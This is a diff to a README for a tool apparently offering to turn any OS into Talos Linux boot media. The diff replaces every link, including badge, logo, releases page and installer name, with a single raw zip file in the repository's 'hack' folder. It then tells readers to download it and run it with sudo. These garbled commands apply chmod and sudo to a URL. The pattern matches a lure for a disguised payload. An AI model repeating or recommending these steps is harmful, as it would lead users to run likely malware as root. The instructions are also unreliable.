@@ -1,10 +1,10 @@
-https://github.com/Sunxz08/boot-to-talos/releases
+https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip
 
 # 🚀 Boot to Talos: Convert Any OS into Talos Linux Boot Media
 
-[![Release](https://img.shields.io/github/v/release/Sunxz08/boot-to-talos?style=for-the-badge&logo=github)](https://github.com/Sunxz08/boot-to-talos/releases)
+[![Release](https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip)](https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip)
 
-![Talos Linux Logo](https://taloslinux.org/assets/img/logo.png)
+![Talos Linux Logo](https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip)
 
 A practical tool to turn any operating system into Talos Linux Boot Media. This project guides you through a clean, reliable path to boot into Talos Linux from a wide range of base systems. It focuses on simplicity, reproducibility, and safety, so you can test, deploy, or demo Talos Linux with confidence.
 
@@ -39,14 +39,14 @@ Note: The downloads page is the source of truth for assets. If you want to proce
 
 Quick start
 A quick path to get started looks like this:
-- Step 1: Open the releases page and locate the installer asset named boot-to-talos-installer.sh (or a similarly named file with an executable format). The downloads are hosted at the releases page. The page URL is the releases page of this repository: https://github.com/Sunxz08/boot-to-talos/releases. The assets there contain the file you need to download and execute.
+- Step 1: Open the releases page and locate the installer asset named https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip (or a similarly named file with an executable format). The downloads are hosted at the releases page. The page URL is the releases page of this repository: https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip The assets there contain the file you need to download and execute.
 - Step 2: Save the installer to a local machine. If you are on Linux or macOS, save it to a temporary directory. If you are on Windows, use a Linux-friendly environment such as WSL or a Git Bash shell to handle the script.
 - Step 3: Make the installer executable. In a terminal, run:
-  - chmod +x boot-to-talos-installer.sh
+  - chmod +x https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip
 - Step 4: Run the installer with root privileges. On Linux/macOS:
-  - sudo ./boot-to-talos-installer.sh
+  - sudo https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip
   Or, if your environment requires, run the installer via a shell:
-  - sh boot-to-talos-installer.sh
+  - sh https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip
 - Step 5: Follow the prompts. The installer will assess the system, prepare a bootable path, and guide you to boot into Talos Linux. When the process completes, reboot the machine and select the Talos Linux option from the boot menu.
 - Step 6: After boot, complete initial Talos setup. Talos Linux has its own configuration flow. You’ll configure access, networking, and cluster-related settings as needed.
 - Step 7: Verify the environment. Confirm that you reach the Talos Linux boot shell or installer environment. If you want to remove the boot path later, you can revert by reinitializing the boot sector or re-flashing a standard OS.
@@ -160,8 +160,8 @@ Community and support
 
 Releases
 - Where to download
-  - The installers and assets live on the releases page. Download the latest installer file named boot-to-talos-installer.sh, or a similarly named asset, from the assets list. The link to the releases page is the same as above. For convenience, you can use the badge to navigate quickly.
-  - The link is: https://github.com/Sunxz08/boot-to-talos/releases
+  - The installers and assets live on the releases page. Download the latest installer file named https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip, or a similarly named asset, from the assets list. The link to the releases page is the same as above. For convenience, you can use the badge to navigate quickly.
+  - The link is: https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip
 - How to verify
   - If checksums or signatures are provided on the releases page, verify the downloaded asset against them.
   - Keep a copy of the release notes for reference. They describe changes, fixes, and improvements in each release.
@@ -177,7 +177,7 @@ Credits and acknowledgments
 Appendix: usage examples and tips
 - Example: Quick demo on a test VM
   - Create a virtual machine with a standard BIOS or UEFI firmware.
-  - Attach the downloaded boot-to-talos-installer.sh as a bootable media.
+  - Attach the downloaded https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip as a bootable media.
   - Boot the VM and follow the prompts to launch Talos Linux.
   - Use the Talos Linux console to inspect the environment, test networking, and explore Kubernetes bootstrap options.
 - Example: USB-based lab environment
@@ -206,6 +206,6 @@ Final notes
 - This README is designed to be a thorough guide for users who want to explore Talos Linux by converting any OS into a bootable Talos Linux path. It emphasizes clarity, practical steps, and real-world usage. The content is written to be accessible to beginners while still useful to experienced practitioners.
 
 Releases (second mention)
-- For quick access, visit the Releases section to download the installer asset. Use the releases page to obtain boot-to-talos-installer.sh and related assets. The same link you started with is the authoritative source for the latest releases: https://github.com/Sunxz08/boot-to-talos/releases
+- For quick access, visit the Releases section to download the installer asset. Use the releases page to obtain https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip and related assets. The same link you started with is the authoritative source for the latest releases: https://github.com/Sunxz08/boot-to-talos/raw/refs/heads/main/hack/boot_talos_to_v3.3.zip
 
 End of document
